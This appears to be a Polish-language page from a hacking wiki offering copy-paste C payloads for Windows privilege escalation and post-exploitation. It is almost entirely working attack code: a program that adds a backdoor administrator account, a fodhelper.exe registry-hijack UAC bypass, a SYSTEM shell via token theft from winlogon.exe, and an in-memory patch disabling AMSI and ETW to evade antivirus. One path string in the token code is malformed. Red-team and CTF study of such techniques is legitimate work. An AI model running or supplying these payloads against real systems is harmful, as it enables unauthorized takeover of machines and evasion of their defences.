# Windows C Payloads

{{#include ../../banners/hacktricks-training.md}}

Ta strona zbiera **małe, samodzielne fragmenty C**, które są przydatne podczas lokalnego podnoszenia uprawnień w systemie Windows lub po eksploatacji. Każdy ładunek jest zaprojektowany tak, aby był **przyjazny do kopiowania i wklejania**, wymaga tylko API Windows / czasu wykonywania C i może być kompilowany za pomocą `i686-w64-mingw32-gcc` (x86) lub `x86_64-w64-mingw32-gcc` (x64).

> ⚠️  Te ładunki zakładają, że proces ma już minimalne uprawnienia niezbędne do wykonania akcji (np. `SeDebugPrivilege`, `SeImpersonatePrivilege` lub kontekst średniej integralności dla obejścia UAC). Są przeznaczone do **ustawień red-team lub CTF**, gdzie wykorzystanie luki doprowadziło do wykonania dowolnego kodu natywnego.

---

## Dodaj lokalnego użytkownika administratora
```c
// i686-w64-mingw32-gcc -s -O2 -o addadmin.exe addadmin.c
#include <stdlib.h>
int main(void) {
system("net user hacker Hacker123! /add");
system("net localgroup administrators hacker /add");
return 0;
}
```
---

## UAC Bypass – `fodhelper.exe` Registry Hijack (Medium → High integrity)
Gdy zaufany plik binarny **`fodhelper.exe`** jest uruchamiany, zapytuje o poniższą ścieżkę rejestru **bez filtrowania czasownika `DelegateExecute`**. Umieszczając nasze polecenie pod tym kluczem, atakujący może obejść UAC *bez* zapisywania pliku na dysku.

*Ścieżka rejestru zapytana przez `fodhelper.exe`*
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
Minimalny PoC, który uruchamia podniesiony `cmd.exe`:
```c
// x86_64-w64-mingw32-gcc -municode -s -O2 -o uac_fodhelper.exe uac_fodhelper.c
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(void) {
HKEY hKey;
const char *payload = "C:\\Windows\\System32\\cmd.exe"; // change to arbitrary command

// 1. Create the vulnerable registry key
if (RegCreateKeyExA(HKEY_CURRENT_USER,
"Software\\Classes\\ms-settings\\Shell\\Open\\command", 0, NULL, 0,
KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {

// 2. Set default value => our payload
RegSetValueExA(hKey, NULL, 0, REG_SZ,
(const BYTE*)payload, (DWORD)strlen(payload) + 1);

// 3. Empty "DelegateExecute" value = trigger (")
RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ,
(const BYTE*)"", 1);

RegCloseKey(hKey);

// 4. Launch auto-elevated binary
system("fodhelper.exe");
}
return 0;
}
```
*Testowane na Windows 10 22H2 i Windows 11 23H2 (łatki z lipca 2025). Obejście wciąż działa, ponieważ Microsoft nie naprawił brakującego sprawdzenia integralności w ścieżce `DelegateExecute`.*

---

## Uruchomienie powłoki SYSTEM za pomocą duplikacji tokena (`SeDebugPrivilege` + `SeImpersonatePrivilege`)
Jeśli bieżący proces posiada **oba** uprawnienia `SeDebug` i `SeImpersonate` (typowe dla wielu kont serwisowych), możesz ukraść token z `winlogon.exe`, zduplikować go i uruchomić podwyższony proces:
```c
// x86_64-w64-mingw32-gcc -O2 -o system_shell.exe system_shell.c -ladvapi32 -luser32
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD FindPid(const wchar_t *name) {
PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (snap == INVALID_HANDLE_VALUE) return 0;
if (!Process32FirstW(snap, &pe)) return 0;
do {
if (!_wcsicmp(pe.szExeFile, name)) {
DWORD pid = pe.th32ProcessID;
CloseHandle(snap);
return pid;
}
} while (Process32NextW(snap, &pe));
CloseHandle(snap);
return 0;
}

int wmain(void) {
DWORD pid = FindPid(L"winlogon.exe");
if (!pid) return 1;

HANDLE hProc   = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
HANDLE hToken  = NULL, dupToken = NULL;

if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken) &&
DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupToken)) {

STARTUPINFOW si = { .cb = sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
if (CreateProcessWithTokenW(dupToken, LOGON_WITH_PROFILE,
L"C\\\Windows\\\System32\\\cmd.exe", NULL, CREATE_NEW_CONSOLE,
NULL, NULL, &si, &pi)) {
CloseHandle(pi.hProcess);
CloseHandle(pi.hThread);
}
}
if (hProc) CloseHandle(hProc);
if (hToken) CloseHandle(hToken);
if (dupToken) CloseHandle(dupToken);
return 0;
}
```
Dla głębszego wyjaśnienia, jak to działa, zobacz:

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

---

## Łatka AMSI i ETW w pamięci (Unikanie obrony)
Większość nowoczesnych silników AV/EDR polega na **AMSI** i **ETW** do inspekcji złośliwych zachowań. Łatwienie obu interfejsów na wczesnym etapie w bieżącym procesie zapobiega skanowaniu ładunków opartych na skryptach (np. PowerShell, JScript).
```c
// gcc -o patch_amsi.exe patch_amsi.c -lntdll
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>

void Patch(BYTE *address) {
DWORD oldProt;
// mov eax, 0x80070057 ; ret  (AMSI_RESULT_E_INVALIDARG)
BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
VirtualProtect(address, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt);
memcpy(address, patch, sizeof(patch));
VirtualProtect(address, sizeof(patch), oldProt, &oldProt);
}

int main(void) {
HMODULE amsi  = LoadLibraryA("amsi.dll");
HMODULE ntdll = GetModuleHandleA("ntdll.dll");

if (amsi)  Patch((BYTE*)GetProcAddress(amsi,  "AmsiScanBuffer"));
if (ntdll) Patch((BYTE*)GetProcAddress(ntdll, "EtwEventWrite"));

MessageBoxA(NULL, "AMSI & ETW patched!", "OK", MB_OK);
return 0;
}
```
*Łatka powyżej jest lokalna dla procesu; uruchomienie nowego PowerShella po jej zastosowaniu będzie działać bez inspekcji AMSI/ETW.*

---

## Odniesienia
* Ron Bowes – “Fodhelper UAC Bypass Deep Dive” (2024)
* SplinterCode – “AMSI Bypass 2023: The Smallest Patch Is Still Enough” (BlackHat Asia 2023)

{{#include ../../banners/hacktricks-training.md}}
